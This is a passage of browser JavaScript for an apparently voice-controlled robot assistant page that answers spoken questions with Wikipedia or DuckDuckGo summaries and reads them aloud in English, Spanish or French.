        async function processCommand(commandText, lang) {
            stopSpeaking();
            if (activeAbortController) activeAbortController.abort();
            activeAbortController = new AbortController();

            const casual = handleCasualChat(commandText, lang);
            if (casual) {
                showSubtitle(casual);
                speakText(casual, lang);
                return;
            }

            setRobotState('thinking');
            const topic = extractSearchTopic(commandText, lang);

            try {
                let onlineResult = await fetchWikipediaSummary(topic, lang, activeAbortController.signal);
                if (!onlineResult && lang !== 'en-US') {
                    onlineResult = await fetchWikipediaSummary(topic, 'en-US', activeAbortController.signal);
                }
                if (!onlineResult) {
                    onlineResult = await fetchDuckDuckGoFact(topic, activeAbortController.signal);
                }

                let reply;
                if (onlineResult && onlineResult.text) {
                    reply = humanizeOnlineAnswer(onlineResult.title, onlineResult.text, lang, onlineResult.source);
                } else if (lang === 'en-US') {
                    reply = `I searched online for "${topic}", but I didn't find a clear summary right now. Try asking with a slightly shorter name or topic.`;
                } else if (lang === 'es-ES') {
                    reply = `Busqué en línea sobre "${topic}", pero no encontré un resumen claro ahora mismo. Intenta decirlo con palabras un poco más simples.`;
                } else {
                    reply = `J'ai cherché en ligne à propos de "${topic}", mais je n'ai pas trouvé de résumé clair pour l'instant. Essaie de reformuler avec un mot-clé plus simple.`;
                }

                showSubtitle(reply);
                speakText(reply, lang);
            } catch (error) {
                if (error.name === 'AbortError') return;
                const errMsg = lang === 'en-US'
                    ? "I couldn't reach online sources just now. Check your internet connection and try again."
                    : lang === 'es-ES'
                        ? "No pude conectarme a las fuentes en línea ahora mismo. Revisa tu conexión e inténtalo de nuevo."
                        : "Je n'ai pas pu joindre les sources en ligne tout de suite. Vérifie ta connexion internet et réessaie.";
                showSubtitle(errMsg);
                speakText(errMsg, lang);
            }
        }

        function speakText(text, lang) {
            if (!('speechSynthesis' in window)) {
                scheduleSubtitleHide(8000);
                setRobotState('idle');
                return;
            }
            const utterance = new SpeechSynthesisUtterance(text);
            utterance.lang = lang || 'fr-FR';
            const voices = window.speechSynthesis.getVoices();
            let bestVoice = voices.find(v => v.lang === utterance.lang);
            if (!bestVoice) {
                const prefix = (utterance.lang || 'fr').split('-')[0];
                bestVoice = voices.find(v => v.lang.startsWith(prefix));
            }
            if (bestVoice) utterance.voice = bestVoice;
            utterance.rate = 1.06;

            const charsPerSec = utterance.lang.startsWith('en') ? 15 : 13;
            const estimatedSeconds = text.length / charsPerSec;
            const armCycleMs = Math.max(2000, Math.min(3800, estimatedSeconds * 1000 / 2));
            robotBody.style.setProperty('--arm-speed-left', Math.round(armCycleMs) + 'ms');
            robotBody.style.setProperty('--arm-speed-right', Math.round(armCycleMs * 1.12) + 'ms');

            utterance.onstart = () => setRobotState('speaking');
            utterance.onend = () => {
                setRobotState('idle');
                scheduleSubtitleHide(6000);
            };
            utterance.onerror = () => {
                setRobotState('idle');
                scheduleSubtitleHide(7000);
            };
            window.speechSynthesis.speak(utterance);
        }

        function stopSpeaking() {
            if ('speechSynthesis' in window) window.speechSynthesis.cancel();
            setRobotState('idle');
        }

        document.getElementById('micBtn').addEventListener('click', (e) => e.stopPropagation());
    </script>
